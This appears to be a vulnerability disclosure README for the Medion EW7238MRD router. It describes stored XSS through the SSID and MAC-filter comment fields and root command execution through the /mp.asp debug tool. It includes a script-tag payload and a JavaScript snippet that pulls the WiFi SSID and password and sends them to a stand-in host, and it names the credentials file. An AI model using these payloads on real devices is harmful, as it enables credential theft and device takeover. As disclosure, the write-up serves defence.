# Medion EW7238MRD Vulnerabilities

## Stored Cross Site Scripting (XSS)

### Quick Setup

When using ```<script src=//localhost/xss>``` as a WiFi SSID, the XSS payload will be stored as long as the WiFi list in the Quick Setup page is not refreshed.
WiFi SSID's and passwords can be fetched and send to a remote server via this XSS vulnerability.

### MAC Filtering

Using the comment field, XSS can be achieved since there is no validation of user input.<br>
The comment field is limited to 16 characters, but is checked only on the client side.<br>
This XSS can be used with the first XSS vulnerability to persist access to the site.

### Example script to fetch sensitive data
```
window.onload = function() {
	fetch("/wlencrypt5g.asp").then(response => response.text()).then(data => {
		let ssid = data.split('var ssidTbl = 		"')[1].split('"')[0];
        let psk = data.split('var pskValueTbl =	new Array("')[1].split('"')[0];
    	fetch("//localhost/?ssid=" + ssid + "&psk=" + psk);
	});
}
```

## Remote Code Execution

Using the debug tool `/mp.asp`, it's possible to execute commands on the device.<br>
Combining the XSS and this RCE a full compromisation of the device is possible,<br>
including leaking WiFi passwords, accessing the device dashboard and running commands<br>
as root.
The Basic Authentication credentials and other sensitive information can be found in `/var/flash.inc`.<br>

